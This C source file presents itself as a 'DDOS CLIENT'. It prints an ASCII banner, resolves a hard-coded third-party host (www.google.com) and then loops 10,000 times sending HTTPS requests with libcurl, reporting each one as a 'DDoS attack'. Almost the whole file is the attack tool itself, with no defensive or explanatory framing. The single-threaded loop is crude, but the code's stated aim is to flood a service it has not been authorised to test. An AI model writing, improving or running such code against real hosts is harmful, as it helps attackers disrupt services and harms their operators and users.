#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>
#include <curl/curl.h>

void displayTextArt() {
  printf(R"EOF(

▓█████▄ ▓█████▄  ▒█████    ██████     ▄████▄   ██▓     ██▓▓█████  ███▄    █ ▄▄▄█████▓
▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒    ▒██▀ ▀█  ▓██▒    ▓██▒▓█   ▀  ██ ▀█   █ ▓  ██▒ ▓▒
░██   █▌░██   █▌▒██░  ██▒░ ▓██▄      ▒▓█    ▄ ▒██░    ▒██▒▒███   ▓██  ▀█ ██▒▒ ▓██░ ▒░
░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒   ▒▓▓▄ ▄██▒▒██░    ░██░▒▓█  ▄ ▓██▒  ▐▌██▒░ ▓██▓ ░ 
░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒   ▒ ▓███▀ ░░██████▒░██░░▒████▒▒██░   ▓██░  ▒██▒ ░ 
 ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░   ░ ░▒ ▒  ░░ ▒░▓  ░░▓  ░░ ▒░ ░░ ▒░   ▒ ▒   ▒ ░░   
 ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░     ░  ▒   ░ ░ ▒  ░ ▒ ░ ░ ░  ░░ ░░   ░ ▒░    ░    
 ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░     ░          ░ ░    ▒ ░   ░      ░   ░ ░   ░      
   ░       ░        ░ ░        ░     ░ ░          ░  ░ ░     ░  ░         ░          
 ░       ░                           ░                                               



)EOF");
}




void ddos(const char *hostname, int index, int total) {
    CURL *curl = curl_easy_init();
    CURLcode resolution;

    if (curl) {
        char url[256];
        snprintf(url, sizeof(url), "https://%s", hostname);

        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_PORT, 443);

        freopen("/dev/null", "w", stdout); //don't show the get result
        resolution = curl_easy_perform(curl);
        freopen("/dev/tty", "w", stdout); // restablished the standard output

        if (resolution != CURLE_OK) {
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(resolution));
        }
        else {
            printf("DDoS attack on %s was successful.\n", hostname);
        }

        curl_easy_cleanup(curl);
    }
    printf("[%d/%d] Progress: %d%%\r", index, total, (index * 100) / total);
    fflush(stdout);
}

int main(void) {
    struct addrinfo hints;
    struct addrinfo *result;

    const char *hostname = "www.google.com";

    displayTextArt();

    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;

    int exists = getaddrinfo(hostname, NULL, &hints, &result);

    if (exists == 0) {
        printf("DNS exists.\n");
        freeaddrinfo(result);

        int Calls = 10000;
        for (int i = 1; i <= Calls; i++) {
            ddos(hostname, i, Calls);
        }

    } 
    
    else {
        printf("DNS doesn't exist or may have a problem\n");
    }
}
